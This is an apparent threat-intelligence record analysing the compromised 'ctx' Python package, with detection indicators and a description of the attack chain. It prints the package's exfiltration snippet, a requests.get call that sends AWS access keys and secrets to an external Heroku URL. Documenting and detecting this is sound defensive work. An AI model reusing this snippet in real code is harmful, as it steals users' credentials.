package_info.why_malicious: All recent versions of the 'ctx' package were modified to exfiltrate environment variables, including sensitive credentials such as AWS keys, to an external Heroku endpoint. This constitutes credential theft and supply chain compromise.

malicious_snippets.code_snippet:
def sendRequest(self):
    response = requests.get("https://anti-theft-web.herokuapp.com/hacked/" + self.name + "/" + self.access + "/" + self.secret)
malicious_snippets.code_behavior: At import-time, the code collects environment variables and sends them via an HTTP GET request to a hardcoded Heroku endpoint, enabling credential exfiltration.

malice_analysis.why_suspicious: The code exfiltrates all environment variables, which may contain sensitive secrets, to an external server without user consent.
malice_analysis.violated_expectations: A legitimate utility library should not access or transmit environment variables or make unsolicited network requests.
malice_analysis.similar_legitimate_use: Automated error reporting tools may send diagnostic data, but only with user consent and never secrets.

attack_chain.action: User installs or imports the compromised 'ctx' package.
Malicious code collects all environment variables, including secrets.
Environment variables are sent to the attacker's Heroku endpoint via HTTP GET request.

behavioral_signatures: Unexpected network requests to hardcoded endpoints during import or installation
Access to and enumeration of environment variables in utility libraries
Exfiltration of secrets via HTTP(S) requests
file_indicators: ctx/ctx.py containing sendRequest or similar exfiltration logic
Presence of hardcoded URLs referencing Heroku or other external endpoints
network_indicators: Unusual HTTP GET/POST requests during package import or install
detection_knowledge.how_to_detect: Monitor for Python packages that access environment variables and make outbound network requests to untrusted domains, especially during import or installation. Flag any code that sends environment variables or secrets to external endpoints. Use static analysis to detect hardcoded URLs and dynamic analysis to observe runtime exfiltration behavior.
